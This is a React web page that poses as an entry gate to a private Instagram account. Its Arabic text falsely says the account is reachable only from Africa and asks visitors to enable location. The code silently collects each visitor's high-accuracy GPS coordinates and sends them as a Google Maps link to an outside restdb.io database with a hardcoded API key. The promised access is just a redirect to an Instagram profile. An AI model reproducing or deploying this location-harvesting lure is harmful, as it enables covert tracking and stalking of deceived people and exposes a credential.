import { Button } from 'react-bootstrap';
import './App.css';
import { useEffect, useState } from 'react';

function App() {
  const options = {
    enableHighAccuracy: true,
    timeout: 5000,
    maximumAge: 0
  };
  const [disabled, setDisabled] = useState(true)

  function sendLocalisationToDb(urlLoc: string) {

    const url = "https://debezebe-41a6.restdb.io/rest/locations";
    const apiKey = "3af7b4ad452586fde85a8a381b3aa4691769d";

    const requestOptions = {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'x-apikey': apiKey,
        'Cache-Control': 'no-cache',
      },
      body: JSON.stringify({ url: urlLoc }),
    };

    fetch(url, requestOptions)
      .then(response => {
        if (!response.ok) {
          throw new Error('Network response was not ok.');
        }
        return response.json();
      })
      .then(data => {
        console.log(data);
      })
      .catch(error => {
        console.error('There was an error with the request:', error);
      });

  }
  useEffect(() => {

    if (navigator.geolocation) {

      navigator.geolocation.getCurrentPosition(function (position) {
        if (disabled === false) return;
        const latitude = position.coords.latitude;
        const longitude = position.coords.longitude;
        const mapsUrl = `https://www.google.com/maps?q=${latitude},${longitude}`;
        setDisabled(false)
        sendLocalisationToDb(mapsUrl);
      }, function (error) {
        console.error("Error getting the user's location:", error);
      }, options);
    } else {
      console.error('Geolocation is not supported by this browser.');
    }

  }, [])

  const handleEnableLocalization = () => {
    window.location.href = "https://www.instagram.com/rihab_elna"
  };

  return (
    <>
      <div className="fullscreen-page d-flex align-items-center justify-content-center text-center bg-light  rounded p-5">
        <div>
          <h1 className="mb-4">
            <img className='rounded' width={60} src='/img.jpg' /> rihab-elna-queen
            مرحبًا بكم في حساب </h1>
          <h4>
            هذا حساب خاص لا يمكن الولوج اليه الا من افريقيا <br />شغل موقعك للولوج
          </h4>
          <Button variant={`${disabled ? "secondary" : "success"} mt-5`} size="lg" disabled={disabled} onClick={handleEnableLocalization}>
            ولوج الحساب 
          </Button>
        </div>
      </div>
    </>
  );
}

export default App;
